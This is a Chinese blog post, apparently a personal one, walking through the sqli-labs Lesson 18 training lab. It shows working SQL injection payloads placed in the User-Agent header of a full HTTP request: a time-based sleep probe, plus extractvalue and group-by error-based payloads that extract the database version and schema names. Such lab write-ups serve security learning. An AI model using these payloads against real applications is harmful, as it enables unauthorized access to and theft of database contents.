---
id: 648
layout: post
title: 'sqli lab 4 - insert 语句注入'
date: 2016-01-02 16:20:00
author: virusdefender
tags:  安全
---

这一次直接跳到 Lesson-18，之前的课程都可以之前三篇文章的方法去解决的。

这一次的是 insert 语句的注入，这个和之前的其实也很相似的，主要能构造出一个字符串就可以，然后放在 or 或者 and 里面作为条件。

```
POST /sqli-labs/Less-18/ HTTP/1.1
Host: 172.16.61.153
User-Agent: test' or sleep(4) or '
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://172.16.61.153/sqli-labs/Less-18/
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

uname=admin&passwd=admin&submit=Submit
```

发现响应了好几秒，确定注入点就在 User-Agent 上。sql 语句应该类似 `INSERT INTO table (user_agent) VALUES ($_SERVER['HTTP_USER_AGENT'])`

使用 `extractvalue`的 ua 是`User-Agent: test' or extractvalue(1, concat("/", version())) or '`

group by 报错的 ua 是`User-Agent: test' or (select 1 from (select count(*), concat((select schema_name from information_schema.schemata limit 1 offset 1), floor(rand(0)*2))x from information_schema.tables group by x)a) or '`

翻看了一下源代码，在登录的地方进行了转义处理，这样是没问题的，所以不要尝试注入登录的代码了。

```php
function check_input($value)
{
    if(!empty($value))
    {
        // truncation (see comments)
        $value = substr($value,0,20);
    }

    // Stripslashes if magic quotes enabled
    if (get_magic_quotes_gpc())
    {
        $value = stripslashes($value);
    }

    // Quote if not a number
    if (!ctype_digit($value))
    {
        $value = "'" . mysql_real_escape_string($value) . "'";
    }
    else
    {
        $value = intval($value);
    }
    return $value;
}

```
除了 User-Agent 里面会出现注入以外，cookie 和 ip 字段注入也很常见。ip 字段注入一般是服务器端取的`X-Fordwarded-For`字段，而不是`remote_addr`，前一个 http 头是可以伪造的。
